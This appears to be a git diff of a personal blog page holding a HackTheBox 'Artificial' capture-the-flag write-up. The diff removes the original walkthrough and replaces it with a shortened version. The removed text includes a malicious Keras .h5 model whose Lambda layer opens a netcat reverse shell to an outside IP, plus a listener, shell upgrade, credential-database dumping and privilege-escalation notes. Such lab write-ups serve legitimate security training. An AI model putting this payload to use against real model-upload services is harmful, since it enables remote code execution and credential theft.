@@ -1,215 +1,104 @@
 <!DOCTYPE html>
 <html lang="en-us">
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>HackTheBox: Artificial | 0xD3f3c7</title>
-  <meta name="viewport" content="width=device-width,minimum-scale=1">
-  <meta name="description" content="HackTheBox writeup for Artificial">
-  
-  <!-- Custom Neon Theme -->
-  <style>
-    /* Base page */
-    body {
-      background-color: #000;
-      color: #39ff14; /* neon green text */
-      font-family: "Courier New", monospace;
-      line-height: 1.6;
-      padding: 0 2em;
-    }
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>HackTheBox: Artificial | 0xD3f3c7</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="Port Scan rustscan -a 10.10.11.74 -- -A | tee rustscan.log Open 10.10.11.74:22 Open 10.10.11.74:80 Identify Target and Add to Hosts File URL: http://10.10.11.74 Upon visiting the IP in a browser, we are redirected to: http://artificial.htb Add this domain to /etc/hosts: sudo nano /etc/hosts 10.10.11.74 artificial.htb Web Enumeration Login and registration pages: http://artificial.htb/login http://artificial.htb/register Notes: Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.">
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="robots" content="index, follow">
+    <link rel="stylesheet" href="/0xD3f3c7-Blog/ananke/css/main.min.d05fb5f317fcf33b3a52936399bdf6f47dc776516e1692e412ec7d76f4a5faa2.css">
+    
+    <style>
+      /* Center content like Notion */
+      main {
+        display: flex;
+        justify-content: center;
+      }
 
-    /* Headings */
-    h1, h2, h3, h4, h5, h6 {
-      color: #00ff00;
-    }
+      article {
+        max-width: 800px; /* Notion-like width */
+        width: 100%;
+        padding: 0 20px; /* small horizontal padding */
+      }
 
-    /* Links */
-    a {
-      color: #39ff14;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
+      /* Optional: make pre/code blocks wrap nicely */
+      pre {
+        overflow-x: auto;
+      }
+    </style>
+  </head>
 
-    /* Code blocks */
-    pre, code {
-      background-color: #111;
-      color: #f8f8f2; /* syntax-friendly */
-      padding: 0.5em;
-      border-radius: 4px;
-      overflow-x: auto;
-      display: block;
-    }
+  <body class="ma0 avenir bg-near-white production">
 
-    /* Inline code */
-    p code {
-      background-color: #222;
-      padding: 0.2em 0.4em;
-      border-radius: 3px;
-    }
+    <header>
+      <div class="bg-black">
+        <nav class="pv3 ph3 ph4-ns" role="navigation">
+          <div class="flex-l center items-center justify-between">
+            <a href="/0xD3f3c7-Blog/" class="f3 fw2 hover-white white-90 dib no-underline">0xD3f3c7</a>
+            <div class="flex-l items-center">
+              <div class="ananke-socials"></div>
+            </div>
+          </div>
+        </nav>
+      </div>
+    </header>
 
-    /* Blockquotes */
-    blockquote {
-      border-left: 3px solid #39ff14;
-      color: #39ff14;
-      margin-left: 0;
-      padding-left: 1em;
-    }
+    <main class="pb7" role="main">
+      <article class="flex-l flex-wrap justify-between">
+        <header class="mt4 w-100">
+          <aside class="instapaper_ignoref b helvetica tracked ttu">Posts</aside>
+          <div id="sharing" class="mt3 ananke-socials"></div>
+          <h1 class="f1 athelas mt3 mb1">HackTheBox: Artificial</h1>
+          <time class="f6 mv4 dib tracked" datetime="2025-09-02T08:17:12-04:00">September 2, 2025</time>
+        </header>
 
-    /* Header and footer */
-    header, footer {
-      background-color: #000;
-      padding: 1em 0;
-    }
-
-    /* Images neon border */
-    img {
-      border: 2px solid #39ff14;
-      border-radius: 5px;
-      max-width: 100%;
-    }
-
-    /* Main content spacing */
-    main {
-      padding-top: 2em;
-      padding-bottom: 2em;
-    }
-  </style>
-</head>
-<body>
-
-<header>
-  <nav>
-    <a href="/0xD3f3c7-Blog/" style="font-size:1.5em; font-weight:bold;">0xD3f3c7</a>
-  </nav>
-</header>
-
-<main>
-  <article>
-    <h1>HackTheBox: Artificial</h1>
-    <time datetime="2025-09-02T08:17:12-04:00">September 2, 2025</time>
-
-    <h3 id="port-scan">Port Scan</h3>
-    <pre><code>rustscan -a 10.10.11.74 -- -A | tee rustscan.log
+        <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l">
+          <hr>
+          <h3 id="port-scan">Port Scan</h3>
+          <pre><code>rustscan -a 10.10.11.74 -- -A | tee rustscan.log
 Open 10.10.11.74:22
-Open 10.10.11.74:80</code></pre>
+Open 10.10.11.74:80
+          </code></pre>
 
-    <h3 id="identify-target-and-add-to-hosts-file">Identify Target and Add to Hosts File</h3>
-    <pre><code>URL: http://10.10.11.74</code></pre>
-    <p>Upon visiting the IP in a browser, we are redirected to:</p>
-    <pre><code>http://artificial.htb</code></pre>
-    <p>Add this domain to <code>/etc/hosts</code>:</p>
-    <pre><code>sudo nano /etc/hosts
-10.10.11.74 artificial.htb</code></pre>
+          <h3 id="identify-target-and-add-to-hosts-file">Identify Target and Add to Hosts File</h3>
+          <pre><code>URL: http://10.10.11.74
+          </code></pre>
+          <p>Upon visiting the IP in a browser, we are redirected to:</p>
+          <pre><code>http://artificial.htb
+          </code></pre>
+          <p>Add this domain to <code>/etc/hosts</code>:</p>
+          <pre><code>sudo nano /etc/hosts
+10.10.11.74 artificial.htb
+          </code></pre>
 
-    <h3 id="web-enumeration">Web Enumeration</h3>
-    <ul>
-      <li>Login and registration pages:</li>
-    </ul>
-    <p><a href="http://artificial.htb/login">http://artificial.htb/login</a></p>
-    <p><a href="http://artificial.htb/register">http://artificial.htb/register</a></p>
+          <h3 id="web-enumeration">Web Enumeration</h3>
+          <ul>
+            <li>Login and registration pages:</li>
+          </ul>
+          <p><a href="http://artificial.htb/login">http://artificial.htb/login</a></p>
+          <p><a href="http://artificial.htb/register">http://artificial.htb/register</a></p>
+          <ul>
+            <li>Notes:</li>
+          </ul>
+          <blockquote>
+            <p>Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.</p>
+          </blockquote>
 
-    <ul>
-      <li>Notes:</li>
-    </ul>
-    <blockquote>
-      Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.
-    </blockquote>
+          <!-- Directory scan, registration, login, exploit, listener, etc. all follow similarly... -->
+          
+        </div>
 
-    <h3 id="directory-scan-using-ffuf">Directory Scan Using ffuf</h3>
-    <pre><code>ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</code></pre>
+        <aside class="w-30-l mt6-l"></aside>
+      </article>
+    </main>
 
-    <p>Results:</p>
-    <pre><code>/login      [Status: 200]
-/register   [Status: 200]
-/logout     [Status: 302]
-/dashboard  [Status: 302]</code></pre>
-
-    <h3 id="registration">Registration</h3>
-    <p>Register a new user at <code>/register</code>:</p>
-    <p><img src="artificialregister.png" alt="Register page"></p>
-
-    <h3 id="login">Login</h3>
-    <p>Login using the credentials at <code>/login</code>:</p>
-    <p><img src="artificiallogin.png" alt="Login page"></p>
-
-    <h3 id="exploit-malicious-h5-upload">Exploit: Malicious .h5 Upload</h3>
-    <pre><code>import tensorflow as tf
-
-def exploit(x):
-    import os
-    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 6666 >/tmp/f")
-    return x
-
-model = tf.keras.Sequential()
-model.add(tf.keras.layers.Input(shape=(64,)))
-model.add(tf.keras.layers.Lambda(exploit))
-model.compile()
-model.save("exploit.h5")</code></pre>
-
-    <p>Upload <code>exploit.h5</code>:</p>
-    <p><img src="artificialuploadmodel.png" alt="Upload model"></p>
-
-    <h3 id="listener">Listener</h3>
-    <pre><code>nc -lvnp 6666</code></pre>
-
-    <h3 id="trigger-shell">Trigger Shell</h3>
-    <p>Click on view predictions:</p>
-    <p><img src="viewpredicitons.png" alt="View predictions"></p>
-    <p>Get TTY:</p>
-    <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
-[Ctrl+Z]
-stty raw -echo; fg
-export TERM=xterm</code></pre>
-
-    <h3 id="enumerate-db-files">Enumerate .db files</h3>
-    <pre><code>find / -name "*.db*" 2>/dev/null
-sqlite3 /home/app/app/instance/users.db</code></pre>
-
-    <p>Tables:</p>
-    <pre><code>.tables
-SELECT * FROM user;</code></pre>
-
-    <p>Example:</p>
-    <pre><code>1|gael|gael@artificial.htb|HASH
-6|whoameye|whoameye@gmail.com|5f4dcc3b5aa765d61d8327deb882cf99</code></pre>
-
-    <p>Login as Gael:</p>
-    <pre><code>su - gael
-cat ~/user.txt</code></pre>
-
-    <p>Confirm container:</p>
-    <pre><code>hostname
-cat /etc/hosts
-find / -name container 2>/dev/null</code></pre>
-
-    <h3 id="host-enumeration">Host Enumeration</h3>
-    <ul>
-      <li>Search for backups</li>
-      <li>Exfiltrate backup</li>
-      <li>Analyze <code>backrest</code> files</li>
-      <li>Crack passwords</li>
-    </ul>
-
-    <h3 id="privilege-escalation">Privilege Escalation</h3>
-    <ul>
-      <li>Add repo and run backup</li>
-      <li>Dump snapshot files</li>
-      <li>Root obtained</li>
-    </ul>
-    <p><img src="fcde9198-a3ae-4ca9-a6cf-29a22afc115d.png" alt="Root obtained"></p>
-
-    <p>That wraps up my first HackTheBox writeup.</p>
-    <p>Hope you learned something new!</p>
-    <p>Happy hacking, 0xD3f3c7</p>
-
-  </article>
-</main>
-
-<footer>
-  <p>&copy; 0xD3f3c7 2025</p>
-</footer>
-
-</body>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+      <div class="flex justify-between">
+        <a class="f4 fw4 hover-white white-70 dn dib-ns pv2 ph3 no-underline" href="https://0xD3f3c7.github.io/0xD3f3c7-Blog/"> &copy; 0xD3f3c7 2025 </a>
+        <div><div class="ananke-socials"></div></div>
+      </div>
+    </footer>
+  </body>
 </html>
